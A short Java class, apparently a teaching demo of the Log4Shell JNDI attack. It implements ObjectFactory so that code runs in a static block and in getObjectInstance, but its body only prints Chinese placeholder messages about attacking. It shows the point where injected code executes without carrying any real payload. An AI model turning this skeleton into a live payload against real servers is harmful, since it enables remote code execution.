package log4j;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Attack implements ObjectFactory {

    static {
        System.out.println("静态代码块攻击");
    }


    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("做一些攻击操作");

        // 可以做任何操
        return "【攻击者】";
    }
}